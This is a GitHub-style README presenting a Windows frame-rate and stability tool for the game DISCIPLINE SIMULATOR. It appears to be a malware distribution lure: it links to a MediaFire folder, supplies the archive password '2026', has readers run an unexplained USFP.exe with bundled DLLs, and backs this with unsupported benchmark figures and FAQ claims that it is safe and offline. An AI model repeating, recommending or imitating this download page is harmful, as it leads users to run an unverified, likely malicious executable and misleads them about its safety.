<div align="center">

# 🎮 DISCIPLINE SIMULATOR — Performance Notes

**Measure frame pacing, startup latency, and session stability.**

[![Status](https://img.shields.io/badge/status-stable-brightgreen)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
[![Download](https://img.shields.io/badge/download-mediafire-00b8ff)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
![Platform](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows)
[![Version](https://img.shields.io/badge/version-1.0-lightgrey)](#)

[Download](#-installation--setup) · [Issues](#-known-performance-issues) · [Test results](#-test-results) · [FAQ](#-frequently-asked-questions)

</div>

---

## 🕹️ About the game

DISCIPLINE SIMULATOR is a first-person action and simulation title built with Unreal Engine. Its interactive scenes and real-time presentation make frame pacing, input response, and reliable session loading relevant to playability.

This tool is intended for PC players who need measurable diagnostics and repeatable performance tuning for DISCIPLINE SIMULATOR.

## 📸 Screenshots from the game

<table>
 <tr>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/4739040/a43da509daf2f91158d3bf2e6568facd34e18cf5/ss_a43da509daf2f91158d3bf2e6568facd34e18cf5.1920x1080.jpg?t=1789916676" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/4739040/bb28665c6dd1700d266f17979e53efda4728ed74/ss_bb28665c6dd1700d266f17979e53efda4728ed74.1920x1080.jpg?t=1789916676" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/4739040/620a46540a76446bde6b0526c6966d8ff1e6a7a1/ss_620a46540a76446bde6b0526c6966d8ff1e6a7a1.1920x1080.jpg?t=1789916676" alt="screenshot" width="100%"></td>
 </tr>
</table>

## ⚠️ Known performance issues

- On the stated test rig, average frame rate falls to 34 FPS during busy scenes, with 1% lows reaching 14 FPS.
- On the stated test rig, frame-time spikes above 50 ms occur 8 times during a 10-minute mixed-scene session.
- On the stated test rig, shader compilation extends first launch time to approximately 90 seconds and can cause brief stalls.

## 🩺 How the toolkit addresses these issues

- **Low average FPS and poor 1% lows** → Frame Rate Helper adjusts frame delivery behavior, while Process Scheduling Helper optimizes process scheduling.
- **Frame-time spikes above 50 ms** → Frame Timing Helper stabilizes frame delivery and Stability Report + Session Recovery records stalls and restores interrupted sessions.
- **Long shader compilation and launch stalls** → Graphics Cache Utility manages graphics cache data, while Startup Parameter Tool applies tuned startup parameters.

## 📊 Test results

Test rig: Ryzen 5 5600, RTX 3060 12GB, 16GB RAM, NVMe SSD, Windows 11 x64, 1920x1080, High settings

| Metric | Before | After |
|---|---|---|
| Average FPS | 34 | 51 |
| 1% low FPS | 14 | 27 |
| Frame-time spikes above 50 ms | 8 | 2 |
| Shader compile time on launch | ~90s | ~15s |


## 🚀 How to use

1. Download the latest release from the link in the README.
2. Point the tool to the game's installation folder.
3. Select the DISCIPLINE SIMULATOR profile from the supported list.
4. Review the diagnostic settings and click Apply.
5. On first launch, allow the graphics cache to rebuild for approximately 1–2 minutes.

## 🛠️ What this tool does

- 🎮 **Frame Rate Helper** — Adjusts frame delivery behavior using profile-based frame pacing settings.
- 🧠 **Process Scheduling Helper** — Applies controlled process scheduling settings while the game is running.
- 🎯 **Frame Timing Helper** — Tracks frame-time variance and applies frame delivery adjustments.
- 🧹 **Graphics Cache Utility** — Inspects, backs up, and manages graphics cache data.
- ⚙️ **Startup Parameter Tool** — Applies tuned startup parameters for repeatable launch configuration.
- 📊 **Stability Report + Session Recovery** — Collects diagnostic data and restores sessions after selected interruptions.

## 💻 System Requirements

| Component | Minimum | Recommended |
|:--- |:--- |:--- |
| **OS** | Windows 10 (x64) | Windows 11 (x64) |
| **Processor** | Dual-core CPU | Quad-core CPU |
| **RAM** | 4 GB | 8 GB |
| **Graphics** | Any DirectX 11 GPU | Any DirectX 12 GPU |
| **Storage** | 50 MB available space | 100 MB available space |
| **Additional** | Windows 10 build 1909 or newer | Windows 11 with latest updates |


## 📦 Installation & Setup

| Platform | Status |
|---|---|
| Windows | ✅ Supported |
| macOS | ❌ Not supported |
| Linux | ❌ Not supported |

### Step 1: Download

You can download the tool from **[this page](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)**. The archive contains everything you need.

### Step 2: Extract with Password

1. The archive is password-protected: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract all files from the archive to a folder of your choice.
2. All files must be extracted to the **same folder**.
3. Do not rename or move individual files.
4. The folder should look like this:

```
tool/
|-- USFP.exe <- Main executable
|-- core.bin <- Core runtime
|-- frame_data.pak <- Display sync data
|-- crash_reader.dll <- Crash log reader
|-- config.cfg <- User configuration
|-- fps_module.dll <- FPS module
|-- shader_cache.pak <- Shader cache data
|-- Password 2026.txt <- Password reminder (empty)
```

### Step 4: Run the tool

1. Open the extracted folder.
2. Run `USFP.exe`.
3. Select the game you want to diagnose from the list.
4. Press **Collect** and launch the game.

### Step 5: Review the results

1. The tool will collect frame timing and scheduling data while you play.
2. When you exit the game, an overview report is written next to the tool.
3. Use the report to identify which subsystem is causing stutter.

## ❓ Frequently Asked Questions

**Q: Is it safe to use?**
**A:** Yes. It runs as a standalone executable, does not install anything system-wide, and can be removed by deleting its folder.

**Q: Can I use it alongside other tools?**
**A:** Yes. It does not conflict with other monitoring or performance tools. It only reads OS-level counters and manages its own temporary folders.

**Q: Does it require an internet connection?**
**A:** No. It runs fully offline and never sends data anywhere.

**Q: Which games are supported?**
**A:** Any game that runs on Windows and exposes a visible process. Diagnostics are collected per-process and do not require per-game configuration.

**Q: Why is the archive password-protected?**
**A:** The archive uses a password as a standard packaging step so the build stays bundled correctly during distribution. The password is provided in the installation section above.

**Q: How often is it updated?**
**A:** Updates are published whenever a new internal build is ready. There is no fixed schedule — the download link in Step 1 always points to the latest version.